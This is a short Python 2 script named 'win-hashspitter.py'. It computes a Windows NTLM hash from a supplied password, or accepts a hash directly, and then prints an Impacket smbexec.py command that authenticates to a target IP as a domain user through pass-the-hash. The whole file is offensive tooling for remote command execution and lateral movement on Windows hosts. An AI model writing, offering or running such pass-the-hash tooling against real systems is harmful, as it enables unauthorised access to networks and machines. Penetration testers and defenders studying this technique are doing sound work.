#!/usr/bin/env python
import sys
import hashlib
import binascii
import os

if len(sys.argv) != 5:
    print "##############################################################################"
    print ""
    print "Usage: python win-hashspitter.py <hash or pass> <password to hash/or ntlm> <ip-address> <domain/user>"
    print "Example: python win-hashspitter.py pass P@ssw0rd1234 10.10.10.10 corp.com/alex"
    print "Example: python win-hashspitter.py hash 643F5625A4E347D9208DBA1C3F299AF4 10.10.10.10 corp.com/alex"
    print "##############################################################################"
    pass
    sys.exit()
print ""

def ntlmhasher(passIn):
    if sys.argv[1] == "pass":
        print "=========================================================="
        print "Supplied password will be converted to NTLM Hash"
        print "=========================================================="
        print "Supplied password   || " + sys.argv[2]
        password = str(passIn)
        ntlmHash = hashlib.new('md4', password.encode('utf-16le')).digest()
        ntlm = binascii.hexlify(ntlmHash)
        print "NTLM hash generated || " + ntlm
        print "----------------------------------------------------------"
    else:

        ntlm = sys.argv[2]
    return ntlm

def smbexec(ntlm,ipAdd,domUser):
        command = "smbexec.py "+domUser+'@'+ipAdd+" -hashes "+LANMAN_ZEROS+":"+ntlm
        print(command)
        
LANMAN_ZEROS="00000000000000000000000000000000"
hashorPass = sys.argv[1]
ntlm = ntlmhasher(sys.argv[2])
ipAdd = sys.argv[3]
domUser = sys.argv[4]

smbexec(ntlm,ipAdd,domUser)

